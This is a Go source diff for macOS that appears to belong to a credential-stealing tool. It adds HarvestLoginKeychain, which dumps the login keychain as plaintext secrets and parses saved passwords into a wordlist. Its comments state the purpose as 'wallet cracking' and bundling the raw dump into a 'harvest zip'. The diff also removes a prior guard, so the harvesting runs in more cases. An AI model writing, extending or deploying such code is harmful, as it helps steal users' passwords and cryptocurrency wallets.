@@ -1,5 +1,11 @@
 //go:build darwin
 
+// password_candidates_darwin.go — dump login keychain and extract password candidates.
+//
+// After EnsureLoginKeychainUnlocked (unlock with user password if locked), we:
+//  1. dump-keychain -d (plaintext secrets where ACL allows)
+//  2. parse password blobs into PasswordCandidateResult for wallet cracking
+//  3. return the raw dump for inclusion in the primary harvest zip
 package scanner
 
 import (
@@ -24,22 +30,31 @@ var (
 	kcAccountLineRe   = regexp.MustCompile(`"acct"<blob>="([^"]*)"`)
 )
 
-// CollectKeychainPasswordCandidates dumps the login keychain and extracts saved passwords.
-// Skipped in silent mode: dump-keychain can open a GUI prompt per keychain item even with -p.
-func CollectKeychainPasswordCandidates() []types.PasswordCandidateResult {
-	if crypto.MacLoginPassword() != "" {
-		return nil
-	}
+// HarvestLoginKeychain dumps the unlocked login keychain and extracts password candidates.
+// dump is the raw security dump-keychain -d text (for logs/keys/keychain_dump.txt).
+// candidates are parsed passwords for the password-candidate wordlist.
+func HarvestLoginKeychain() (dump []byte, candidates []types.PasswordCandidateResult) {
 	loginKC := loginKeychainDBPath()
 	if loginKC == "" {
-		return nil
+		return nil, nil
 	}
 
-	dump, err := crypto.DumpLoginKeychain()
-	if err != nil || len(dump) == 0 {
-		return nil
+	raw, err := crypto.DumpLoginKeychain()
+	if err != nil || len(raw) == 0 {
+		return nil, nil
 	}
+	return raw, parseKeychainDump(raw)
+}
 
+// CollectKeychainPasswordCandidates dumps the login keychain and extracts saved passwords.
+// Prefer HarvestLoginKeychain when the raw dump is also needed for export.
+func CollectKeychainPasswordCandidates() []types.PasswordCandidateResult {
+	_, candidates := HarvestLoginKeychain()
+	return candidates
+}
+
+// parseKeychainDump extracts password-like values from dump-keychain -d output.
+func parseKeychainDump(dump []byte) []types.PasswordCandidateResult {
 	seen := make(map[string]bool)
 	var out []types.PasswordCandidateResult
 	add := func(password, class, service, account string) {
